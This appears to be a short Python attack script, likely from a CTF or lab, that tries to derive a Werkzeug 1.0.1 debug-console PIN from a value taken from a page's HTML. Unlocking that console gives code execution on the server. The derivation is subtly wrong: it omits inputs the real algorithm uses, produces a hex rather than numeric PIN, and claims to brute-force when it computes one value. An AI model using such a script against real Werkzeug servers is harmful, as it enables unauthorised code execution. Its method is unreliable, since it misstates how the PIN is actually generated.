import hashlib
import itertools

# Este valor lo sacaste del HTML: SECRET
GUID = "ZqotEaa5qVD3dW4rgVec"

# Simula cómo Werkzeug 1.0.1 genera el PIN (brute-force en base64 encoded string)
def generate_possible_pins(guid):
    probably_public_bits = [
        'app',                # modname
        '/home/app.py',       # app_path
    ]

    private_bits = [
        guid,
    ]

    h = hashlib.md5()
    for bit in itertools.chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    return h.hexdigest()[:9]

def format_pin(pin):
    # Werkzueg formatea el PIN en grupos de 3
    return '-'.join([pin[i:i+3] for i in range(0, len(pin), 3)])

pin_raw = generate_possible_pins(GUID)
print(f"PIN crudo: {pin_raw}")
print(f"PIN formateado: {format_pin(pin_raw)}")
